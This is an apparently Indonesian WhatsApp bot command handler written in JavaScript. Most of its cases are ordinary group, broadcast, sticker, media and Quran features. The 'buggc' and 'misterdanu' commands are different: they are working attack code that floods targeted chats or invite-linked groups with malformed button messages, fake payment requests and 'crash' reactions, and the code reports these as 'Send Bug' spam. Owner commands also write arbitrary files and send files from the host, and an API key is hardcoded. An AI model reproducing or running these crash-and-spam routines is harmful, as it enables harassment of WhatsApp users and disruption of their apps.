				if (!isCreator) return m.reply(act.owner)
				if (args.length < 1) return m.reply(`Link atau Usernamenya mana?`)
				//fs.writeFileSync(`./${q}`,JSON.stringify(q))
				await require("fs").writeFileSync(q, m.quoted.text);
				m.reply('success')
				break
			case 'kick': {
				if (!m.isGroup) return m.reply(act.gc)
        		if (!isBotAdmins) return m.reply(act.botadm)
        		if (!isAdmins) return m.reply(act.admin)
				let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
				await conn.groupParticipantsUpdate(from, users, 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				}
				break
			case 'add': {
				if (!m.isGroup) return m.reply(act.gc)
        		if (!isBotAdmins) return m.reply(act.botadm)
        		if (!isAdmins) return m.reply(act.gc)
				let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
				await conn.groupParticipantsUpdate(from, users, 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				}
				break
			case 'promote': {
				if (!m.isGroup) return m.reply(act.gc)
        		if (!isBotAdmins) return m.reply(act.botadm)
       		 if (!isAdmins) return m.reply(act.admin)
				let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
				await conn.groupParticipantsUpdate(from, users, 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				}
				break
			case 'demote': {
				if (!m.isGroup) return m.reply(act.gc)
      		  if (!isBotAdmins) return m.reply(act.botadm)
       		 if (!isAdmins) return m.reply(act.admin)
				let users = m.mentionedJid[0] ? m.mentionedJid : m.quoted ? [m.quoted.sender] : [text.replace(/[^0-9]/g, '')+'@s.whatsapp.net']
				await conn.groupParticipantsUpdate(from, users, 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				}
				break
			//BC BELOM WORK BANH
			case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) return m.reply(act.owner)
                if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} Hallo semua`)
                let anu = await conn.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
				for (let yoi of anu) {
		  	  await sleep(1500)
			    let btn = [{
                                urlButton: {
                                    displayText: '𝑺𝑼𝑷𝑶𝑹𝑻 𝑼𝑺!',
                                    url: 'https://instagram.com/uidoajwn'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝑴𝑬𝑵𝑼',
                                    id: 'menu'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: '𝑺𝑪𝑹𝑰𝑷𝑻',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 ALL Broadcast Bot 」\n\n${text}`
                      conn.send5ButImg(yoi, txt, conn.user.name, global.thumb, btn)
					}
					m.reply('Sukses Broadcast')
          		  }
         		   break
			case 'bcgc': case 'bcgroup': {
                if (!isCreator) return m.reply(act.owner)
                if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} Hallo semua`)
                let getGroups = await conn.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: '𝑺𝑼𝑷𝑶𝑹𝑻 𝑼𝑺!',
                                    url: 'https://instagram.com/uidoajwn'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝑴𝑬𝑵𝑼',
                                    id: 'menu'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: '𝑺𝑪𝑹𝑰𝑷𝑻',
                                    id: 'sc'
                                }
                            }]
                      let txt = `「 Broadcast Group 」\n\n${text}`
                      conn.send5ButLoc(i, txt, global.footer, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
			case 'tesbut':{
			let buttons = [
                    {buttonId: `tes`, buttonText: {displayText: 'tes'}, type: 1},
                    {buttonId: `tes`, buttonText: {displayText: 'tes'}, type: 2},
                    {buttonId: `tes`, buttonText: {displayText: 'tes'}, type: 3},
                    {buttonId: `tes`, buttonText: {displayText: 'tes'}, type: 4},
                    {buttonId: `tes`, buttonText: {displayText: 'tes'}, type: 5}
                ]
                conn.sendMessage(from, {text:`*NGETES BUTTON*`, title: 'WALLET', footer: '© 2022 Fadhil Graphy', buttons: buttons})
                }
                break
				case 'misterdanu':
    nd = q.split("|")
    if (Number(nd[0]) >= 1000) return m.reply('Jumlah terlalu banyak!')
    for (let i = 0; i < nd[0]; i++){
    conn.relayMessage(from, { reactionMessage }, { messageId: "crash" })
	await sleep(5000)
    conn.relayMessage(from, { reactionMessage }, { messageId: "crash" })
	await sleep(5000)    
	conn.relayMessage(from, { reactionMessage }, { messageId: "crash" })
    await sleep(5000)}
break
			case 'request': case 'requestfitur':{
				if (!text) return m.reply(`Text mana?\n\nExample : ${prefix + command} Tambahin fitur tiktok downloader dong`)
				conn.sendMessage(`687909979@s.whatsapp.net`, {text: `*Hallo owner ada yang request fitur nih*\n\nPesan : ${text}\nPengirim : ${m.sender}`}, {quoted: {key: { fromMe: false,
				participant: `${m.sender}`, ...(from ? { remoteJid: "687909979-1589321480@g.us" } : {})},
				message: { "extendedTextMessage": {
				"text": `Request Fitur!`,
				"title": `Pasang iklan murah bang`,
				'jpegThumbnail': global.thumb}}}})
				m.reply('suksess request')
				}
				break
			case 'tagall': {
                if (!m.isGroup) return m.reply(act.gc)
                if (!isBotAdmins) return m.reply('jadikan gw admin dulu')
                if (!isAdmins) return m.reply('only admin')
				let teks = `─────✪〘 *👥 Tag All* 〙✪─────
 
 ≻ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `╰≻ @${mem.id.split('@')[0]}\n`
                }
                conn.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
			case 'jodohku': {
           	 if (!m.isGroup) return m.reply(act.gc)
          	  let member = participants.map(u => u.id)
          	  let me = m.sender
          	  let jodoh = member[Math.floor(Math.random() * member.length)]
          	  let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
           	 let ments = [me, jodoh]
          	  let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await conn.sendButtonText(from, buttons, jawab, global.footer, m, {mentions: ments})
          	  }
           	 break
            case 'jadian': {
           	 if (!m.isGroup) return m.reply(act.gc)
          	  let member = participants.map(u => u.id)
           	 let orang = member[Math.floor(Math.random() * member.length)]
          	  let jodoh = member[Math.floor(Math.random() * member.length)]
            	let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
         	   let menst = [orang, jodoh]
          	  let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jadian' }, type: 1 }
                    ]
                    await conn.sendButtonText(from, buttons, jawab, global.footer, m, {mentions: menst})
       	     }
        	    break
			case 'addanoucment': case 'addnewfitur':
				if (!isCreator) return m.reply(act.owner)
				snt.push(`${q}`)
				snt.splice(0,1)
				fs.writeFileSync('./database/anoucement.json', JSON.stringify(snt))
				m.reply('success anoucement!')
				break
			case 'block': {
				if (!isCreator) return m.reply(act.owner)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
				await conn.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				}
				break
      	  case 'unblock': {
				if (!isCreator) return m.reply(act.owner)
				let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
				await conn.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
				}
				break
			case 'copystyle':
				if (args.length < 2) return m.reply(`khusus button`)
				let judul = q.split('|')[0] ? q.split('|')[0] : q
				let style = q.split('|')[1] ? q.split('|')[1] : ''
				var captionnye = `copy hasilnya dibawah ya!\n\nName : ${judul}\nStyle : ${style}`
				var copynye = `${style}`
				const menuButa = [
    				{index: 1, urlButton: {displayText: `Copy Here`, url: 'https://www.whatsapp.com/otp/copy/'+copynye}}
				]
  			  await conn.sendMessage(from, { text: `${captionnye}`, templateButtons: menuButa, footer: `Terimakasih telah menggunan Crizzy-Bot\nDonasi untuk suport bot!\n\n© 2022 Fadhil Graphy` })
				break
	  	  case 'style': case 'styletext': {
				let { styletext } = require('./lib/scraper')
				if (!text) return m.reply('Masukkan Query text!')
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                var list = []
                for (let i of anu) {
                list.push({
				title: i.name, rowId: `copystyle ${i.name} | ${i.result}`, description: `${i.result}`})
				}
				var sections = [{title: `Pilih salah satu lalu kirim.`, rows:list}]
				var listms = { text: `*Srtle Text*\n\nBerhasil menemukan sytle font\nSilahkan pilih font yang anda suka.`, footer: `Terimakasih telah menggunan Crizzy-Bot\nDonasi untuk suport bot!\n\n© 2022 Fadhil Graphy`, buttonText: "Click Here", sections }
				conn.sendMessage(from, listms, {quoted:m})
	  		  }
	  		  break
			case 'anticall': {
           	 if (!isCreator) return m.reply(act.owner)
                let ciko = JSON.parse(fs.readFileSync('./database/setting.json'));
                if (args[0] === "on") {
                if (ciko.setting.anticall == true) return m.reply(`Sudah Aktif Sebelumnya`)
                ciko.setting.anticall = true
				fs.writeFileSync('./database/setting.json', JSON.stringify(ciko))
                m.reply(`AntiCall Aktif !`)
                } else if (args[0] === "off") {
                if (ciko.setting.anticall == false) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                ciko.setting.anticall = false
				fs.writeFileSync('./database/setting.json', JSON.stringify(ciko))
                m.reply(`AntiCall Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'anticall on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'anticall off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await conn.sendButtonText(from, buttons, `Mode AntiCall`, global.footer, m)
                }
          	   }
       	      break
			case 'ping': case 'botstatus': case 'statusbot': {
           	  const used = process.memoryUsage()
           	  const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
           	  })
           	  const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
        	     }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
           	  }
         	    })
           	  let timestamp = speed()
        	     let latensi = speed() - timestamp
          	   neww = performance.now()
      	       oldd = performance.now()
       	      respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
                m.reply(respon)
       	     }
         	   break
			case 'pinterest': {
               	 m.reply(act.wait)
					let { pinterest } = require('./lib/scraper')
               	 anu = await pinterest(text)
               	 result = anu[Math.floor(Math.random() * anu.length)]
              	  conn.sendMessage(from, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
         		   }
          		  break
			case 'smeme': case 'stickmeme': case 'stikmeme': case 'stickermeme': case 'stikermeme': {
	       	 if (!/image/.test(mime)) return m.reply(`Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`)
      	      if (!text) return m.reply(`Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`)
	   	     m.reply(act.wait)
       	     atas = text.split('|')[0] ? text.split('|')[0] : '-'
      	      bawah = text.split('|')[1] ? text.split('|')[1] : '-'
	  	      let dwnld = await conn.downloadMediaMessage(qmsg)
	 	       let { floNime } = require('./lib/uploader')
	  	      let fatGans = await floNime(dwnld)
	       	 let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${fatGans.result.url}`
	  	      let has = await conn.sendImageAsSticker(from, smeme, m, { packname: global.packname, author: global.auhor })
	  	      await fs.unlinkSync(has)
       	     }
	  	      break     
			case 'emojimix': {
				let [emoji1, emoji2] = text.split`+`
				if (!emoji1) return m.reply(`Example : ${prefix + command} 😅+🤔`)
				if (!emoji2) return m.reply(`Example : ${prefix + command} 😅+🤔`)
				let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
				for (let res of anu.results) {
				    let encmedia = await conn.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
				    await fs.unlinkSync(encmedia)
				}
	 		   }
	  		  break
			case 'emojimix2': {
	  		  if (!text) return m.reply(`Example : ${prefix + command} 😅`)
				let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
				for (let res of anu.results) {
		  	  let encmedia = await conn.sendImageAsSticker(from, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		 	   await fs.unlinkSync(encmedia)
				}
	  		  }
	  		  break
	        case 'attp': case 'ttp': {
          	  if (!text) return m.reply(`Example : ${prefix + command} text`)
         	   await conn.sendMedia(from, `https://xteam.xyz/${command}?file&text=${text}`, 'Fadhil', 'Graphy', m, {asSticker: true})
    		    }
     		   break
			case 'setname': case 'setsubject': {
                if (!m.isGroup) return m.reply(act.gc)
                if (!isBotAdmins) return m.reply(act.botadm)
                if (!isAdmins) return m.reply(act.admin)
                if (!text) return m.reply('Text ?')
                await conn.groupUpdateSubject(from, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
       	     }
          	  break
           case 'setdesc': case 'setdesk': {
                if (!m.isGroup) return m.reply(act.gc)
                if (!isBotAdmins) return m.reply(act.botadm)
                if (!isAdmins) return m.reply(act.admin)
                if (!text) return m.reply('Text ?')
                await conn.groupUpdateDescription(from, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
          	  }
       	     break
           case 'setppbot': {
                if (!isCreator) return m.reply(act.owner)
                if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                await conn.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) return m.reply(act.gc)
                if (!isAdmins) return m.reply(act.admin)
                if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                await conn.updateProfilePicture(from, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(act.success)
                }
                break
			case 'hidetag': {
           	 if (!m.isGroup) return m.reply(act.gc)
            	if (!isBotAdmins) return m.reply(act.botadm)
          	  if (!isAdmins) return m.reply(act.admin)
         	   conn.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
         	   }
            	break
            case 'totag': {
               if (!m.isGroup) return m.reply(act.gc)
               if (!isBotAdmins) return m.reply(act.botadm)
               if (!isAdmins) return m.reply(act.admin)
               if (!m.quoted) return m.reply(`Reply pesan dengan caption ${prefix + command}`)
               conn.sendMessage(from, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break
            case 'setstatus': case 'setbiobot': case 'setbotbio': {
            	if (!isCreator) return m.reply(act.owner)
         	  if (!text) return m.reply(`this is a WhatsApp Bot named conn-Morou`)
        	   let name = await conn.updateProfileStatus(text)
           	m.reply(`Successfully changed bot bio status to ${name}`)
         	  }
           	break
			case 'setnamabot': case 'setnamebot': {
				if (!isCreator) return m.reply(act.owner)
        	   if (!text) return m.reply( `Example : ${prefix + command} WhatsApp ✅`)
       	    let name = await conn.updateProfileName(text)
        	   m.reply(`Successfully renamed bot to ${name}`)
      	     }
       	    break
			case 'linkgroup': case 'linkgc': {
               if (!m.isGroup) return m.reply(act.gc)
               if (!isBotAdmins) return m.reply(act.botadm)
               let response = await conn.groupInviteCode(from)
               conn.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
      	      }
     	       break
			case 'listpc': {
                let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                for (let i of anu) {
                    let nama = store.messages[i].array[0].pushName
                    teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                }
                 conn.sendTextWithMentions(from, teks, m)
        	    }
     	       break
            case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await conn.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 conn.sendTextWithMentions(from, teks, m)
       	      }
          	   break
            case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    conn.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
      	       }
        	     break
			case 'ebinary': {
        	    if (!text) return m.reply(`Example : ${prefix + command} text`)
           	 let { eBinary } = require('./lib/binary')
          	  let eb = await eBinary(text)
           	 m.reply(eb)
       		 }
       		 break
            case 'dbinary': {
          	  if (!text) return m.reply(`Example : ${prefix + command} text`)
          	  let { dBinary } = require('./lib/binary')
          	  let db = await dBinary(text)
            	m.reply(db)
       		 }
      	  	break
			case 'tomp4': case 'tovideo': {
                if (!/webp/.test(mime)) return m.reply(`Reply stiker dengan caption *${prefix + command}*`)
                m.reply(act.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
        	    }
           	 break
            case 'toaud': case 'toaudio': {
        	    if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`)
        	    m.reply(act.wait)
          	  let media = await conn.downloadMediaMessage(qmsg)
          	  let { toAudio } = require('./lib/converter')
         	   let audio = await toAudio(media, 'mp4')
          	  conn.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
          	  }
           	 break
            case 'tomp3': {
          	  if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`)
          	  m.reply(act.wait)
           	 let media = await conn.downloadMediaMessage(qmsg)
           	 let { toAudio } = require('./lib/converter')
            	let audio = await toAudio(media, 'mp4')
           	 conn.sendMessage(from, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${conn.user.name}.mp3`}, { quoted : m })
           	 }
           	 break
            case 'tovn': case 'toptt': {
         	   if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`)
          	  m.reply(act.wait)
          	  let media = await conn.downloadMediaMessage(qmsg)
          	  let { toPTT } = require('./lib/converter')
          	  let audio = await toPTT(media, 'mp4')
         	   conn.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
           	 }
          	  break
            case 'togif': {
                if (!/webp/.test(mime)) return m.reply(`Reply stiker dengan caption *${prefix + command}*`)
                m.reply(act.wait)
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await conn.sendMessage(from, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
         	   }
          	  break
	        case 'tourl': {
                m.reply(act.wait)
				let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await conn.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            	}
          	  break
			case 'name':
				conn.sendMessage(from, {text: conn.getName('687909979@s.whatsapp.net')})
				break
				case 'getcase': 
				case 'xiewe': {
				if (!isCreator) return m.reply('gamau')
				let turbrek = `break`
				if (!args[0]) return m.reply("Mau ngambil case apa?")
				try {
				m.reply('case ' + `'${args[0]}'` + fs.readFileSync('./handler.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
				} catch {
				m.reply("Case tidak ditemukan")
				}
				}
				break

				case 'delete': case 'del': case 'hapus': {
					if (!m.quoted) m.reply(false)
					let { chat, fromMe, id, isBaileys } = m.quoted
					if (!isBaileys) return replay(`The Message Was Not Sent By A Bot!`)
					conn.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
				}
				break

				case 'sendfile':{
                   
                    if (!isCreator) return m.reply(`gak mau`)
                    if (!q) return m.reply(`stres`)
                    let anu = fs.readFileSync(q)
                    conn.sendMessage(m.chat, { document: anu, mimetype: 'application/octet-stream', fileLength: '69000000000000000', fileName: `${q}`, jpegThumbnail: thumb }, {quoted:fdocs})  
                    }
                    break
					case 'public': {
						if (!isCreator) return m.replay(`gak`)
						conn.public = true
						m.reply('Successful Change To Public Usage')
					}
					break
					case 'self': {
						if (!isCreator) return m.replay(`gak`)
						conn.public = false
						m.reply('Successful Change To Self Usage')
					}
					break
case "buggc": {
    if(!isCreator) return m.reply(`jangan lucu lucu lah masbro`)
    if(args.length < 1) return m.reply(`*Contoh Penggunaan:* #${command} tipe id jid jumlah\n*`);
    if(!args[3]) return m.reply(`Jumlahnya?`)
    if((args[0]) === 'duar') {
        if((args[1]) === 'id') {
            for (var i = 0; i < args[3]; i++) {
await sleep(3000)
		conn.sendMessage(args[2], { 
		text: '', 
		templateButtons: [
		{ callButton: { displayText: `kkkk`, phoneNumber: ``}},
		{ urlButton: { displayText: `kkk`, url: `https://wa.me/`}},
		{ urlButton: { displayText: `kkkk`, url: `https://www.whatsapp.com/otp/copy/`}},
		{ quickReplyButton: { displayText: `kkkk`, id: ``}},
		{ quickReplyButton: { displayText: `kkk`, id: ``}},
		{ quickReplyButton: { displayText: `kkkk`, id: ``}},
		]})
            }
            await m.reply(`Success Send Bug To: ${args[2].split("@")[0]}\nAmount Spam: ${args[3]}\nType: ${args[0]} ${args[1]}`);
        } else if((args[1]) === 'link') {
            if(!isUrl(args[2]) && !args[2].includes('whatsapp.com')) return m.reply(`Link Error`);
            var result = args[2].split('https://chat.whatsapp.com/')[1]
            var res = await conn.groupAcceptInvite(result)
            try {
for (var i = 0; i < args[3]; i++) {
await sleep(3000)
    conn.sendMessage(`${res}`, { 
		text: '', 
		templateButtons: [
		{ callButton: { displayText: `kkkk`, phoneNumber: ``}},
		{ urlButton: { displayText: `kkk`, url: `https://wa.me/`}},
		{ urlButton: { displayText: `kkkk`, url: `https://www.whatsapp.com/otp/copy/`}},
		{ quickReplyButton: { displayText: `kkkk`, id: ``}},
		{ quickReplyButton: { displayText: `kkk`, id: ``}},
		{ quickReplyButton: { displayText: `kkkk`, id: ``}},
		]})
};
await m.reply(`Success Send Bug To: ${res.split("@")[0]}\nAmount Spam: ${args[3]}\nType: ${args[0]} ${args[1]}`);
            } catch (err) {
m.reply(jsonformat(err));
            };
        } else {
            var content = '*List type:*\n'
            content += `#${command} duar id\n`
            content += `#${command} duar link\n`
            m.reply(content);
        };
    } else if((args[0]) === 'payment') {
        if((args[1]) === 'id') {
            for (var i = 0; i < args[3]; i++) {
var requestPaymentMessage = generateWAMessageFromContent(args[2], proto.Message.fromObject({
    requestPaymentMessage: {
        currencyCodeIso4217: "USD",
        amount1000: 1000,
        requestFrom: args[2],
        Message: {
            extendedTextMessage: {
text: m.name
            }, 
        }, 
    },
}), { userJid: args[2], quoted: m })
await conn.relayMessage(args[2], requestPaymentMessage.message, { messageId: '' })
            };
            await m.reply(`*Success Send Bug!*\nTo: ${args[2].split("@")[0]}\nAmount Spam: ${args[3]}\nType: ${args[0]} ${args[1]}`);
        } else if((args[1]) === 'link') {
            if(!isUrl(args[2]) && !args[2].includes('whatsapp.com')) return m.reply(`Link Error`);
            var result = args[2].split('https://chat.whatsapp.com/')[1]
            var res = await conn.groupAcceptInvite(result)
            try {
for (var i = 0; i < args[3]; i++) {
    var requestPaymentMessage = generateWAMessageFromContent(`${res}`, proto.Message.fromObject({
        requestPaymentMessage: {
            currencyCodeIso4217: "USD",
            amount1000: 1000,
            requestFrom: `${res}`,
            Message: {
extendedTextMessage: {
    text: ''
}, 
            }, 
        },
    }), { userJid: `${res}`, quoted: m })
    await conn.relayMessage(`${res}`, requestPaymentMessage.message, { messageId: '' })
    await sleep(3000)
};
await m.reply(`Success Send Bug To: ${res.split("@")[0]}\nAmount Spam: ${args[3]}\nType: ${args[0]} ${args[1]}`);
            } catch (err) {
m.reply(jsonformat(err));
            };
        } else {
            var content = '*List type:*\n'
            content += `#${command} duar id\n`
            content += `#${command} payment link\n`
            m.reply(content);
        }; 
    } else {
        var content = '*List Type:*\n'
        content += `#${command} duar\n`
        content += `#${command} payment\n`
        m.reply(content);
    };
};
break;

case 'alquran':
            case 'al-quran': {
                if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
                if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah surah Al-Fatihah ayat 2 beserta audionya, dan ayatnya 1 aja`
                let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
                let txt = `*Arab* : ${res.result.data.text.arab}
*English* : ${res.result.data.translation.en}
*Indonesia* : ${res.result.data.translation.id}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
                m.reply(txt)
                conn.sendMessage(m.chat, {
                    audio: {
                        url: res.result.data.audio.primary
                    },
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })
            }
            break
            case 'tafsirsurah': {
                if (!args[0]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                if (!args[1]) throw `Contoh penggunaan:\n${prefix + command} 1 2\n\nmaka hasilnya adalah tafsir surah Al-Fatihah ayat 2`
                let res = await fetchJson(`https://islamic-api-indonesia.herokuapp.com/api/data/quran?surah=${args[0]}&ayat=${args[1]}`)
                let txt = `「 *Tafsir Surah*  」

*Pendek* : ${res.result.data.tafsir.id.short}

*Panjang* : ${res.result.data.tafsir.id.long}

( Q.S ${res.result.data.surah.name.transliteration.id} : ${res.result.data.number.inSurah} )`
                m.reply(txt)
